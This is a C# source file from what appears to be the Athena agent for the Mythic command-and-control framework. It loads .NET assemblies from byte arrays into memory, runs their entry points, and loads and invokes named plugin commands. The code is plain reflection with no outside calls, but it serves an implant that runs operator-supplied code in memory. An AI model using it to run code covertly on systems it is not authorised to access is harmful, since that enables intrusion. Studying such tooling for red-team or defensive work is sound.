using Athena.Commands.Model;
using Athena.Models.Athena.Commands;
using Athena.Utilities;
using System;
using System.Collections.Generic;
using System.IO;

namespace Athena.Commands
{
    public class AssemblyHandler
    {
        /// <summary>
        /// Load an assembly into our AssemblyLoadContext for later usage
        /// </summary>
        /// <param name="asm">Byte array of assembly to load</param>
        public static string LoadAssembly(byte[] asm)
        {
            //This will load an assembly into our Assembly Load Context for usage with.
            //This can also be used to help fix resolving issues when loading assemblies in trimmed executables.
            try
            {
                //Load DLL Stream into our Assembly Load Context
                Globals.alc.LoadFromStream(new MemoryStream(asm));

                //Return true if success
                return "Assembly Loaded.";
            }
            catch (Exception e)
            {
                Misc.WriteError(e.Message);
                return "Failed to load Assembly!" + Environment.NewLine + e.Message;
            }
        }

        /// <summary>
        /// Execute a compiled assembly in our AssemblyLoadContext
        /// </summary>
        /// <param name="asm">Byte array of the assembly to execute</param>
        /// <param name="args">Args string to pass to the assembly</param>
        public static bool ExecuteAssembly(byte[] asm, string args)
        {
            //Will need to figure out how to determine when output is finished? Maybe add some sleeps and check the buffer, if nothing in the buffer then mark as complete and return?
            try
            {
                var assembly = Globals.alc.LoadFromStream(new MemoryStream(asm));
                assembly.EntryPoint.Invoke(null, new object[] { Utilities.Misc.SplitCommandLine(args) });
                return true;
            }
            catch (Exception e)
            {
                Misc.WriteError(e.Message);
                return false;
            }
        }

        /// <summary>
        /// Reset the AssemblyLoadContext
        /// </summary>
        public static string ClearAssemblyLoadContext()
        {
            //This will clear out the assembly load context for the Athena agent in order to leave it fresh for future use.
            //This will help scenarios where you have a library loaded with a specific version, but need to load that library again for a different one
            try
            {
                Globals.alc.Unload();  
                Globals.alc = new ExecuteAssemblyContext();
                return "AssemblyLoadContext cleared!";
            }
            catch (Exception e)
            {
                Misc.WriteError(e.Message);
                return "Failed to clear AssemblyLoadContext!" + Environment.NewLine + e.Message;
            }
        }

        /// <summary>
        /// Load a Mythic command
        /// </summary>
        /// <param name="asm">Byte array of the assembly to load</param>
        /// <param name="name">Name of the command being loaded</param>
        public static string LoadCommand(byte[] asm, string name)
        {
            try
            {
                if (!Globals.loadedcommands.ContainsKey(name))
                {
                    Globals.loadedcommands.Add(name, Globals.loadcontext.LoadFromStream(new MemoryStream(asm)));
                    return "Command Loaded!";
                }
                else
                {
                    return "Command already loaded!";
                }
            }
            catch (Exception e)
            {
                Misc.WriteError(e.Message);
                return "Failed to load Command!" + Environment.NewLine + e.Message;
            }
        }

        /// <summary>
        /// Execute a loaded Mythic command
        /// </summary>
        /// <param name="name">Name of the command to execute</param>
        /// <param name="args">Args string to pass to the assembly</param>
        public static PluginResponse RunLoadedCommand(string name, Dictionary<string, object> args)
        {
            try
            {
                Type t = Globals.loadedcommands[name].GetType("Athena.Plugin");
                var methodInfo = t.GetMethod("Execute", new Type[] { typeof(Dictionary<string,object>) });
                var result = methodInfo.Invoke(null, new object[] { args });

                PluginResponse pr = new PluginResponse()
                {
                    output = (string)result.GetType().GetProperty("output").GetValue(result),
                    success = (bool)result.GetType().GetProperty("success").GetValue(result)
                };
                return pr;
            }
            catch (Exception e)
            {
                Misc.WriteError(e.Message);
                return new PluginResponse()
                {
                    output = e.Message,
                    success = false
                };
            }
        }
    }
}
